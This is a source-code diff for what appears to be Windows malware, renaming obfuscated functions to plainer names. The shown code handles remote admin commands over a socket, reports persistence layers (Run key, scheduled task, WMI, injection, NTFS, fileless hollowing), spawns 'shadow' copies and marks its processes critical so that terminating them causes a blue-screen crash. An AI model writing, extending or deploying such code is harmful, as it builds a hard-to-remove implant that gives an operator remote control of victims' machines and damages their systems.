@@ -66,7 +66,7 @@ static int download_module(const char *url, const char *out_path) {
 /* Auto-protect thread for shadow copies: waits 15 seconds then protects */
 DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
     Sleep(500);  /* Small delay to let startup finish, then protect immediately */
-    obf_sys_protect_process();
+    util_set_critical();
     return 0;
 }
 
@@ -214,11 +214,11 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Spawned 3 copies + ALL layers: Run key, Task, WMI, Injection, NTFS, Fileless Hollow]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
-        obf_sys_unprotect_process();
+        util_clear_critical();
         result = "[Critical flag removed — process can now be terminated]";
     }
     else if (strcmp(cmd, "CHECK_PROTECTION") == 0) {
-        const char *critical_status = obf_sys_check_critical_status();
+        const char *critical_status = util_check_critical();
         const char *admin_status = sys_is_admin() ? "admin" : "not admin";
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
@@ -302,7 +302,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         }
         
         /* Layer 4: Critical flag */
-        const char *crit = obf_sys_check_critical_status();
+        const char *crit = util_check_critical();
         util_appendf(response, &resp_pos, "[L4] Critical flag: %s\n", crit);
         
         /* Layer 5: Admin status */
@@ -332,7 +332,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         if (!sys_is_admin()) {
             result = "[FAIL: not running as administrator]";
         } else {
-            obf_sys_protect_process();
+            util_set_critical();
             const char *status = sys_protection_status();
             if (strcmp(status, "CRITICAL") == 0) {
                 result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
@@ -489,7 +489,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     /* Auto-protect ALL processes immediately when admin */
     if (sys_is_admin()) {
-        obf_sys_protect_process();
+        util_set_critical();
     }
     if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
